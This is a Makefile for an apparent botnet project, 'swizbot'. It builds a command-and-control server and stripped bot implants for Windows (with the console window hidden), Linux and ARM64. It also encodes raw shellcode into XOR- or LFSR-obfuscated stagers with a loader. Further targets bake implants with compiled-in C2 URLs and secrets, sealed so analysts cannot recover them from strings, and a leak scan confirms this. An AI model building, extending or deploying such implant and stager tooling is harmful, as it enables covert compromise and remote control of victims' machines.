GO ?= go
BIN := bin
BOT_LDFLAGS := -s -w
C2_LDFLAGS := -s -w

.PHONY: all build c2 bot bot-windows bot-linux bot-arm64 test vet fmt stager stager-selftest clean

all: vet test stager-selftest build

build: c2 bot-windows bot-linux

c2:
	$(GO) build -ldflags "$(C2_LDFLAGS)" -o $(BIN)/swizbot-c2 ./cmd/c2

bot: bot-windows bot-linux

bot-windows:
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 $(GO) build -ldflags "$(BOT_LDFLAGS) -H=windowsgui" -o $(BIN)/swizbot-bot.exe ./cmd/bot

bot-windows-386:
	GOOS=windows GOARCH=386 CGO_ENABLED=0 $(GO) build -ldflags "$(BOT_LDFLAGS) -H=windowsgui" -o $(BIN)/swizbot-bot-386.exe ./cmd/bot

bot-linux:
	$(GO) build -ldflags "$(BOT_LDFLAGS)" -o $(BIN)/swizbot-bot-linux ./cmd/bot

bot-arm64:
	GOOS=linux GOARCH=arm64 CGO_ENABLED=0 $(GO) build -ldflags "$(BOT_LDFLAGS)" -o $(BIN)/swizbot-bot-arm64 ./cmd/bot

test:
	$(GO) test ./...

vet:
	$(GO) vet ./...

fmt:
	gofmt -w .

# Encoder self test: emulated decode round-trips for every arch/mode and,
# when nasm is installed, byte-parity against the decoder listings.
stager-selftest:
	python3 stager/encoder.py --selftest

# Build a stager from a raw payload file:
#   make stager PAYLOAD=payloads/calc.bin OUT=output/stager.bin ARCH=x64 MODE=lfsr
PAYLOAD ?= payload.bin
OUT ?= output/stager.bin
ARCH ?= x86
MODE ?= xor   # xor | lfsr | noloop
stager:
	python3 stager/encoder.py $(PAYLOAD) $(OUT) $(shell [ "$(MODE)" = "lfsr" ] && echo --lfsr) $(shell [ "$(MODE)" = "noloop" ] && echo --noloop) --arch $(ARCH) --loader

clean:
	rm -rf $(BIN) output loader.c

# Bake an implant with compiled-in config (see cmd/build):
#   make payload C2_URLS="https://c2.example.com:8443" BOT_SECRET=*** OUT=bin/bot.exe OS=windows ARCH=amd64
# For a zero-leak build, add SEAL="<passphrase>" (implant reads it from SWIZ_UNLOCK at runtime).
C2_URLS ?=
BOT_SECRET ?=
BOT_KEY ?=
C2_PUBKEY ?=
XOR ?=
SEAL ?=
ALLOW_PLAINTEXT ?= # set to 1 to bake secrets obfuscated-only (no -seal)
OS ?= linux
ARCH ?= amd64
OUT ?= bin/swizbot-bot
payload:
	@if [ -n "$(BOT_SECRET)$(BOT_KEY)" ] && [ -z "$(SEAL)" ] && [ "$(ALLOW_PLAINTEXT)" != "1" ]; then \
	  echo "ERROR: refusing to bake secrets without SEAL=<passphrase>."; \
	  echo "       SEAL='...'      -> sealed, zero-leak (needs SWIZ_UNLOCK at runtime)"; \
	  echo "       ALLOW_PLAINTEXT=1 -> obfuscated-only bake (secrets hidden from strings, but recoverable by RE)"; \
	  exit 1; \
	fi
	go run ./cmd/build -c2-urls "$(C2_URLS)" -bot-secret "$(BOT_SECRET)" -bot-key "$(BOT_KEY)" -c2-pubkey "$(C2_PUBKEY)" -xor "$(XOR)" -seal "$(SEAL)" -os $(OS) -arch $(ARCH) -out $(OUT)

# Static leak scan: prove baked config is not string-recoverable.
leakscan:
	bash scripts/leakscan.sh
